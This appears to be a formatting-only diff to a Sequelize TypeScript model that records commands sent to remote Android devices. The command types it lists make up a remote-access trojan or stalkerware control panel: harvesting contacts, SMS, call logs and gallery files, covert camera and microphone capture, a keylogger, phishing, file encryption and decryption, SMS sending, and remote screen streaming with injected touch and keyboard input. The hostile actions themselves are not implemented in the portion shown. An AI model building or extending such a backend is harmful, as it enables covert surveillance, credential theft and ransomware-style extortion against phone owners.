@@ -1,27 +1,58 @@
 // Command Model - Theo dõi lệnh đã gửi đến thiết bị
-import { Table, Column, Model, DataType, PrimaryKey, Default, AllowNull, ForeignKey, BelongsTo } from 'sequelize-typescript';
-import { Optional } from 'sequelize';
-import { Device } from './Device';
-import { User } from './User';
+import {
+  Table,
+  Column,
+  Model,
+  DataType,
+  PrimaryKey,
+  Default,
+  AllowNull,
+  ForeignKey,
+  BelongsTo,
+} from "sequelize-typescript";
+import { Optional } from "sequelize";
+import { Device } from "./Device";
+import { User } from "./User";
 
 // Command status
 export enum CommandStatus {
-  PENDING = 'pending',
-  SENT = 'sent',
-  OK = 'ok',
-  ERROR = 'error',
-  TIMEOUT = 'timeout'
+  PENDING = "pending",
+  SENT = "sent",
+  OK = "ok",
+  ERROR = "error",
+  TIMEOUT = "timeout",
 }
 
 // Available command types (matching Android APK)
 export type CommandType =
-  | 'contacts' | 'sms' | 'calls' | 'gallery'
-  | 'main-camera' | 'selfie-camera' | 'microphone' | 'screenshot'
-  | 'toast' | 'vibrate' | 'play-audio' | 'stop-audio'
-  | 'clipboard' | 'sendSms' | 'keylogger-on' | 'keylogger-off'
-  | 'open-url' | 'phishing' | 'encrypt' | 'decrypt'
-  | 'apps' | 'file-explorer' | 'all-sms' | 'popNotification'
-  | 'start-screen-stream' | 'stop-screen-stream' | 'touch-event' | 'keyboard-event';
+  | "contacts"
+  | "sms"
+  | "calls"
+  | "gallery"
+  | "main-camera"
+  | "selfie-camera"
+  | "microphone"
+  | "screenshot"
+  | "toast"
+  | "vibrate"
+  | "play-audio"
+  | "stop-audio"
+  | "clipboard"
+  | "sendSms"
+  | "keylogger-on"
+  | "keylogger-off"
+  | "open-url"
+  | "phishing"
+  | "encrypt"
+  | "decrypt"
+  | "apps"
+  | "file-explorer"
+  | "all-sms"
+  | "popNotification"
+  | "start-screen-stream"
+  | "stop-screen-stream"
+  | "touch-event"
+  | "keyboard-event";
 
 export interface CommandAttributes {
   id: number;
@@ -37,15 +68,27 @@ export interface CommandAttributes {
   executed_at?: Date | null;
 }
 
-export interface CommandCreationAttributes extends Optional<CommandAttributes, 'id' | 'created_at' | 'updated_at' | 'response' | 'error_message' | 'executed_at'> {}
+export interface CommandCreationAttributes
+  extends Optional<
+    CommandAttributes,
+    | "id"
+    | "created_at"
+    | "updated_at"
+    | "response"
+    | "error_message"
+    | "executed_at"
+  > {}
 
 @Table({
-  tableName: 'commands',
+  tableName: "commands",
   timestamps: true,
-  createdAt: 'created_at',
-  updatedAt: 'updated_at',
+  createdAt: "created_at",
+  updatedAt: "updated_at",
 })
-export class Command extends Model<CommandAttributes, CommandCreationAttributes> {
+export class Command extends Model<
+  CommandAttributes,
+  CommandCreationAttributes
+> {
   @PrimaryKey
   @Default(DataType.UUIDV4)
   @Column(DataType.UUID)
